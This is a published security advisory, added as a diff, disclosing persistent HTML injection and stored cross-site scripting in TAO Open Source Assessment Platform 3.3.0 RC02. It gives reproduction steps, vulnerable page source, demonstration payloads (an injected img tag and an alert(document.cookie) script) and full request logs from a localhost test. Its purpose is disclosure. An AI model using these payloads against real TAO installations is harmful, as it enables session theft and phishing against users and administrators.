@@ -1,0 +1,433 @@
+# Title: TAO Open Source Assessment Platform 3.3.0 RC02 - HTML Injection
+# Author: Vulnerability Laboratory
+# Date: 2020-04-15
+# Vendor: https://www.taotesting.com
+# Software Link: https://www.taotesting.com/product/
+# CVE: N/A
+
+Document Title:
+===============
+TAO Open Source Assessment Platform v3.3.0 RC02 - Multiple Web
+Vulnerabilities
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2215
+
+
+Release Date:
+=============
+2020-04-16
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+2215
+
+
+Common Vulnerability Scoring System:
+====================================
+4
+
+
+Vulnerability Class:
+====================
+Multiple
+
+
+Current Estimated Price:
+========================
+500€ - 1.000€
+
+
+Product & Service Introduction:
+===============================
+Accelerating innovation in digital assessment. The TAO assessment
+platform gives you the freedom, control, and
+support to evolve with today's learners. For organizations who want the
+freedom to control their assessment
+software – from authoring to delivery to reporting.
+
+(Copy of the Homepage: https://www.taotesting.com/product/ )
+
+
+Abstract Advisory Information:
+==============================
+The vulnerability laboratory core research team discovered multiple
+cross site vulnerabilities in the TAO Open Source Assessment Platform
+v3.3.0 RC02.
+
+
+Affected Product(s):
+====================
+Product: TAO Open Source Assessment Platform v3.3.0 RC02
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-04-16: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Medium
+
+
+Authentication Type:
+====================
+Restricted authentication (user/moderator) - User privileges
+
+
+User Interaction:
+=================
+Low User Interaction
+
+
+Disclosure Type:
+================
+Independent Security Research
+
+
+Technical Details & Description:
+================================
+1.1
+A html injection web vulnerability has been discovered in the TAO Open
+Source Assessment Platform v3.3.0 RC02 web-application.
+The vulnerability allows remote attackers to inject own malicious html
+codes with persistent attack vector to compromise browser
+to web-application requests from the application-side.
+
+The html inject web vulnerability is located in the `userFirstName`,
+`userLastName`, `userMail`, `password2`, and `password3`
+parameters of the user account input field. The request method to inject
+is POST and the attack vector is application-side.
+Remote attackers are able to inject html code for the user account
+credentials to provoke an execution within the main manage
+user listing.
+
+Successful exploitation of the web vulnerability results in persistent
+phishing attacks, persistent external redirects to malicious
+source and persistent manipulation of affected application modules.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Module(s):
+[+] Manage Users
+
+Vulnerable Parameter(s):
+[+] userFirstName
+[+] userLastName
+[+] userMail
+[+] password2
+[+] password3
+
+
+
+1.2
+Multiple persistent cross site web vulnerabilities has been discovered
+in the TAO Open Source Assessment Platform v3.3.0 RC02.
+The vulnerability allows remote attackers to inject own malicious script
+codes with persistent attack vector to compromise browser to
+web-application requests from the application-side.
+
+The persistent vulnerability is located in the content parameter of the
+Rubric Block (Add) module. Attackers are able to inject own malicious
+script code inside of the rubric name value. The attached values will be
+redisplayed in the frontend of tao. The request method to inject is
+POST and the attack vector is located on the application-side. The
+injection point is the Rubric Block (Add) module and the execution occurs
+in the frontend panel when listing the item attribute.
+
+Successful exploitation of the web vulnerability results in session
+hijacking, persistent phishing attacks, persistent external redirects
+to malicious source and persistent manipulation of affected or connected
+application modules.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Module(s):
+[+] Rubric Block (Add)
+
+Vulnerable Parameter(s):
+[+] content
+
+
+Proof of Concept (PoC):
+=======================
+1.1
+The persistent html injection web vulnerability can be exploited by
+remote attackers with privileged user account and low user interaction.
+For security demonstration or to reproduce the security web
+vulnerability follow the provided information and steps below to continue.
+
+
+Manual steps to reproduce the vulnerability ...
+1. Install the application and open the ui
+2. Move on top right to the user button and click manage users
+3. Inject html script code payload into the vulnerable input fields
+4. Save the entry
+5. Open to the manage users listing
+Note: The payloads executes in the table that shows the user account
+values for admins
+6. Successful reproduce of the html inject vulnerability!
+
+
+PoC: Vulnerable Source (Manage Users)
+<th class="actions">Actions</th>
+</tr></thead>
+<tbody>
+<tr data-item-identifier="http_2_localhost_1_tao_0_rdf_3_i1586957152301539">
+<td class="login"><img
+src="https://www.evolution-sec.com/evosec-logo.png"></td>
+<td class="firstname"><img
+src="https://www.evolution-sec.com/evosec-logo.png"></td>
+<td class="lastname"><img
+src="https://www.evolution-sec.com/evosec-logo.png"></td>
+<td class="email"><img
+src="https://www.evolution-sec.com/evosec-logo.png"></td>
+<td class="roles">Test Taker</td>
+<td class="guiLg">German</td>
+<td class="status"><span class="icon-result-ok"></span> enabled</td>
+
+
+--- PoC Session Logs (POST) ---
+http://localhost:89/tao/Users/edit
+Host: localhost:89
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0)
+Gecko/20100101 Firefox/74.0
+Accept: text/html, */*; q=0.01
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 1393
+Origin: http://localhost:89
+Connection: keep-alive
+Referer:
+http://localhost:89/tao/Main/index?structure=users&ext=tao&section=edit_user
+Cookie: tao_GP8CPowQ=d6et7oifjip9jnkbc7pgeotsdj;
+tao_0855799=e0a3289004cc96a4ffba7bdcb8515d3665ccd004
+user_form_sent=1&tao.forms.instance=1&token=e0a3289004cc96a4ffba7bdcb8515d3665ccd004&http_2_www_0_w3_0_org_1_2000_1_01_1_
+rdf-schema_3_label=<img
+src="https://www.evolution-sec.com/evosec-logo.png">&id=http://localhost/tao.rdf#i1586957152301539
+&http_2_www_0_tao_0_lu_1_Ontologies_1_generis_0_rdf_3_userFirstName=<img
+src="https://www.evolution-sec.com/evosec-logo.png">
+&http_2_www_0_tao_0_lu_1_Ontologies_1_generis_0_rdf_3_userLastName=<img
+src="https://www.evolution-sec.com/evosec-logo.png">
+&http_2_www_0_tao_0_lu_1_Ontologies_1_generis_0_rdf_3_userMail=<img
+src="https://www.evolution-sec.com/evosec-logo.png">&http_2_www_0_tao_0_lu_1_Ontologies_1_generis_0_rdf_3_userUILg=http_2_www_0_tao_0_lu_1_Ontologies_1_TAO_0_rdf_3_Langca&
+http_2_www_0_tao_0_lu_1_Ontologies_1_generis_0_rdf_3_userRoles_9=http_2_www_0_tao_0_lu_1_Ontologies_1_TAO_0_rdf_3_DeliveryRole&
+classUri=http_2_www_0_tao_0_lu_1_Ontologies_1_TAOSubject_0_rdf_3_Subject&uri=http_2_localhost_1_tao_0_rdf_3_i1586957152301539
+&password2=<img src="https://www.evolution-sec.com/evosec-logo.png">
+&password3=<img src="https://www.evolution-sec.com/evosec-logo.png">
+-
+POST: HTTP/1.1 200 OK
+Server: Apache/2.4.38 (Win32) PHP/7.2.15
+X-Powered-By: PHP/7.2.15
+Set-Cookie: tao_0855799=a4dd4f04e0f27648dcd6ee3e966cdb380d511079; path=/
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+
+Reference(s):
+http://localhost:89/tao/Users/edit
+http://localhost:89/tao/Main/index
+
+
+
+1.2
+The persistent cross site scripting web vulnerability can be exploited
+by remote attackers with privileged user account with low user interaction.
+For security demonstration or to reproduce the cross site scripting web
+vulnerability follow the provided information and steps below to continue.
+
+
+Manual steps to reproduce the vulnerability ...
+1. Open and login to the tao application
+2. Move into the test module on top
+3. Add new Rubric Block
+4. Inject script code test payload into the text label content input field
+5. Save the entry and move on the right site to activate
+6. The click on activate includes and executes the content immediatly
+7. Succesful reproduce of the cross site scripting vulnerability!
+
+
+PoC: Vulnerable Source
+<div class="rubricblock-content"><div>asd>"><span
+data-serial="img_l9lmylhuv8hf55xo9z264n"
+class="widget-box widget-inline widget-img" data-qti-class="img"
+contenteditable="false">
+<img data-serial="img_l9lmylhuv8hf55xo9z264n" data-qti-class="img"
+src="" alt="" style=""
+width="100%"></span> <img data-serial="img_rxephz0lwthtejgsndo2f3"
+data-qti-class="img" src="evil.source" alt="" style="">&nbsp;
+>"<script>alert(document.cookie)></script></div></iframe></div></div>
+</li></ol>
+
+
+PoC: Payload
+"<script>alert(document.cookie)></script>
+
+
+--- PoC Session Logs [POST] ---
+http://localhost:89/taoQtiTest/Creator/saveTest?uri=http%3A%2F%2Flocalhost%2Ftao.rdf%23i1586971961942612
+Host: localhost:89
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 9664
+Origin: http://localhost:89
+Connection: keep-alive
+Referer:
+http://localhost:89/tao/Main/index?structure=tests&ext=taoTests&section=authoring
+Cookie: tao_X3GLb7Ke=i89lfik72ts13i8soadgfb64hb;
+tao_f46245c=9ebdee0d0f34b349a61ba23443ecc950c43a0042
+model={"qti-type":"assessmentTest","identifier":"Test-1","title":"QTI
+Example Test","toolName":"tao","toolVersion":"2.7","outcomeDeclarations":[],
+"timeLimits":{"qti-type":"timeLimits","maxTime":7810,"allowLateSubmission":false},"testParts":[{"qti-type":"testPart","identifier":"Introduction","navigationMode":1,"submissionMode":0,"preConditions":[],"branchRules":[],
+"itemSessionControl":{"qti-type":"itemSessionControl","maxAttempts":0,"showFeedback":false,"allowReview":true,"showSolution":false,"allowComment":false,
+"validateResponses":false,"allowSkipping":true},"assessmentSections":[{"qti-type":"assessmentSection","title":"Section
+1","visible":true,
+"keepTogether":true,"sectionParts":[{"qti-type":"assessmentItemRef","href":"http://localhost/tao.rdf#i1586971963337314","categories":[],
+"variableMappings":[],"weights":[],"templateDefaults":[],"identifier":"item-1","required":false,"fixed":false,"preConditions":[],"branchRules":[],"index":0,
+"itemSessionControl"{"qtitype":"itemSessionControl","maxAttempts":1,"showFeedback":false,"allowReview":true,"showSolution":false,"allowComment":true,
+"validateResponses":false,"allowSkipping":true},"isLinear":false}],"identifier":"assessmentSection-1","required":true,"fixed":false,"preConditions":[],"branchRules":[],
+"itemSessionControl":{"qti-type":"itemSessionControl","maxAttempts":1,"showFeedback":false,"allowReview":true,"showSolution":false,"allowComment":true,"validateResponses":
+false,"allowSkipping":true},"index":0}],"testFeedbacks":[],"index":0},{"qti-type":"testPart","identifier":"QTIExamples","navigationMode":0,"submissionMode":0,"preConditions":[],"branchRules":[],"assessmentSections":[{"qti-type":"assessmentSection","title":"Section
+1","visible":false,"keepTogether":true,"sectionParts":[{"qti-type":"assessmentItemRef","href":"http://localhost/tao.rdf#i1586971964187315","categories":[],"variableMappings":[],"weights":[],"templateDefaults":[],"identifier":"item-2","required":false,"fixed":false,"preConditions":[],"branchRules":[],"index":0,"itemSessionControl":{"qti-type":"itemSessionControl","maxAttempts":1,"showFeedback":false,"allowComment":false,"allowSkipping":true,"validateResponses":false},"isLinear":true,
+"timeLimits":{"maxTime":0,"minTime":0,"allowLateSubmission":false,"qti-type":"timeLimits"}},{"qti-type":"assessmentItemRef",
+"href":"http://localhost/tao.rdf#i1586971965925016","categories":[],"variableMappings":[],"weights":[],"templateDefaults":[],"identifier":"item-3","required":false,"fixed":false,"preConditions":[],"branchRules":[],"index":1,"itemSessionControl":{"qti-type":"itemSessionControl"},"isLinear":true},
+{"qti-type":"assessmentItemRef","href":"http://localhost/tao.rdf#i158697196662817","categories":[],"variableMappings":[],"weights":[],
+"templateDefaults":[],"identifier":"item-4","required":false,"fixed":false,"preConditions":[],"branchRules":[],"index":2,"itemSessionControl
+":{"qti-type":"itemSessionControl"},"isLinear":true},{"qti-type":"assessmentItemRef","href":"http://localhost/tao.rdf#i1586971967539318","categories"
+:[],"variableMappings":[],"weights":[],"templateDefaults":[],"identifier":"item-5","required":false,"fixed":false,"preConditions":[],"branchRules":[],
+"index":3,"itemSessionControl":{"qti-type":"itemSessionControl"},"isLinear":true},{"qti-type":"assessmentItemRef","href":
+"http://localhost/tao.rdf#i1586971968508019","categories":[],"variableMappings":[],"weights":[],"templateDefaults":[],"identifier":"item-6",
+"required":false,"fixed":false,"preConditions":[],"branchRules":[],"index":4,"itemSessionControl":{"qti-type":"itemSessionControl"},"isLinear":true},{"qti-type":"assessmentItemRef","href":"http://localhost/tao.rdf#i1586971969922220","categories":[],"variableMappings":[],"weights":[],"templateDefaults":[],"identifier":
+"item-7","required":false,"fixed":false,"preConditions":[],"branchRules":[],"index":5,"itemSessionControl":{"qti-type":"itemSessionControl"},"isLinear":true},{"qti-type":"assessmentItemRef","href":"http://localhost/tao.rdf#i158697197087021","categories":[],"variableMappings":[],"weights":[],"templateDefaults":[],"identifier":"item-8","required":false,"fixed":false,"preConditions":[],"branchRules":[],"index":6,"itemSessionControl":{"qti-type":"itemSessionControl"},"isLinear":true},{"qti-type":"assessmentItemRef","href":"http://localhost/tao.rdf#i1586971970668622","categories":[],"variableMappings":[],"weights":[],"templateDefaults":[],"identifier":
+"item-9","required":false,"fixed":false,"preConditions":[],"branchRules":[],"index":7,"itemSessionControl":{"qti-type":"itemSessionControl"},"isLinear":true}],"identifier":"assessmentSection-2","required":false,"fixed":false,"preConditions":[],"branchRules":[],"index":0,
+"itemSessionControl":{"qti-type":"itemSessionControl"},"rubricBlocks":[{"qti-type":"rubricBlock","index":0,"content":[{"qti-type":"div","id":"","class":"","xmlBase":"","lang":"","label":"","content":[{"qti-type":"textRun","content":"asd>"<script>alert(document.cookie)></script>",
+"xmlBase":""}]}],"views":["candidate"],"orderIndex":1,"uid":"rb1","feedback":{"activated":false,"outcome":null,"matchValue":null,"qti-type":"feedback"},
+"class":""}]}],"testFeedbacks":[],"index":1}],"testFeedbacks":[],"scoring":{"modes":{"none":{"key":"none","label":"None","description":"No
+outcome processing.
+Erase the existing rules, if
+any.","qti-type":"none"},"custom":{"key":"custom","label":"Custom","description":"bufu","qti-type":"cut"},"qti-type":"modes"},"scoreIdentifier":"SCORE","weightIdentifier":"","cutScore":0.5,"categoryScore":false,"outcomeProcessing":"none","qti-type":"scoring"}}
+-
+POST: HTTP/1.1 200 OK
+Server: Apache/2.4.38 (Win32) PHP/7.2.15
+X-Powered-By: PHP/7.2.15
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Security-Policy: frame-ancestors 'self'
+Content-Length: 14
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: application/json; charset=UTF-8
+-
+http://localhost:89/tao/Main/evil.source
+Host: localhost:89
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept: image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer:
+http://localhost:89/tao/Main/index?structure=tests&ext=taoTests&section=authoring
+Cookie: tao_X3GLb7Ke=i89lfik72ts13i8soadgfb64hb;
+tao_f46245c=9ebdee0d0f34b349a61ba23443ecc950c43a0042
+-
+GET: HTTP/1.1 200 OK
+Server: Apache/2.4.38 (Win32) PHP/7.2.15
+X-Powered-By: PHP/7.2.15
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 169
+Keep-Alive: timeout=5, max=99
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+
+Security Risk:
+==============
+1.1
+The security risk of the html inject web vulnerability in the
+web-application is estimated as medium.
+
+1.2
+The security risk of the persistent cross site scripting web
+vulnerability in the web-application is estimated as medium.
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without
+any warranty. Vulnerability Lab disclaims all warranties,
+either expressed or implied, including the warranties of merchantability
+and capability for a particular purpose. Vulnerability-Lab
+or its suppliers are not liable in any case of damage, including direct,
+indirect, incidental, consequential loss of business profits
+or special damages, even if Vulnerability-Lab or its suppliers have been
+advised of the possibility of such damages. Some states do
+not allow the exclusion or limitation of liability for consequential or
+incidental damages so the foregoing limitation may not apply.
+We do not approve or encourage anybody to break any licenses, policies,
+deface websites, hack into databases or trade with stolen data.
+
+Domains:    www.vulnerability-lab.com		www.vuln-lab.com			
+www.vulnerability-db.com
+Services:   magazine.vulnerability-lab.com
+paste.vulnerability-db.com 			infosec.vulnerability-db.com
+Social:	    twitter.com/vuln_lab		facebook.com/VulnerabilityLab 		
+youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php
+vulnerability-lab.com/rss/rss_upcoming.php
+vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php
+vulnerability-lab.com/register.php
+vulnerability-lab.com/list-of-bug-bounty-programs.php
+
+Any modified copy or reproduction, including partially usages, of this
+file requires authorization from Vulnerability Laboratory.
+Permission to electronically redistribute this alert in its unmodified
+form is granted. All other rights, including the use of other
+media, are reserved by Vulnerability-Lab Research Team or its suppliers.
+All pictures, texts, advisories, source code, videos and other
+information on this website is trademark of vulnerability-lab team & the
+specific authors or managers. To record, list, modify, use or
+edit our material contact (admin@ or research@) to get a ask permission.
+
+				    Copyright © 2020 | Vulnerability Laboratory - [Evolution
+Security GmbH]™
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
